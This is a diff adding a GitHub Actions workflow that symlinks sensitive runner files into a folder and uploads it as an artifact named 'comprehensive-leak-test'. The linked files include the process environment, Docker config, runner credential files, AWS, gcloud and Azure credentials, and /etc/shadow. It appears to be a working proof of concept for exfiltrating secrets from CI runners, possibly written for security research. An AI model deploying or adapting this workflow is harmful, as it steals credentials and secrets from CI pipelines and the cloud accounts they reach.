@@ -1,0 +1,55 @@
+name: Comprehensive Symlink Targets
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: write
+
+jobs:
+  enumerate:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: Create symlinks to all interesting targets
+        run: |
+          mkdir -p leak-targets
+          
+          # Runner environment
+          ln -sf /proc/self/environ leak-targets/proc-environ
+          
+          # Docker Hub credentials  
+          ln -sf /home/runner/.docker/config.json leak-targets/docker-config
+          
+          # Runner credential files
+          ln -sf /home/runner/actions-runner/cached/2.335.1/.credentials leak-targets/runner-credentials 2>/dev/null || true
+          ln -sf /home/runner/actions-runner/cached/2.335.1/.runner leak-targets/runner-config 2>/dev/null || true
+          
+          # Workflow event payload
+          ln -sf /home/runner/work/_temp/_github_workflow/event.json leak-targets/event-payload
+          
+          # Step script (contains our bash code)
+          for f in /home/runner/work/_temp/*.sh; do
+            ln -sf "$f" "leak-targets/step-script-$(basename $f)" 2>/dev/null
+          done
+          
+          # Cloud provider credentials (if present)
+          ln -sf /home/runner/.config/gcloud/application_default_credentials.json leak-targets/gcloud-creds 2>/dev/null || true
+          ln -sf /home/runner/.aws/credentials leak-targets/aws-creds 2>/dev/null || true
+          ln -sf /home/runner/.azure/accessTokens.json leak-targets/azure-tokens 2>/dev/null || true
+          
+          # System files
+          ln -sf /etc/shadow leak-targets/etc-shadow 2>/dev/null || true
+          ln -sf /etc/machine-id leak-targets/machine-id
+          
+          # List what we created
+          ls -la leak-targets/
+
+      - name: Upload all symlink targets
+        uses: actions/upload-artifact@v4
+        with:
+          name: comprehensive-leak-test
+          path: leak-targets/
+          retention-days: 1
+          if-no-files-found: warn
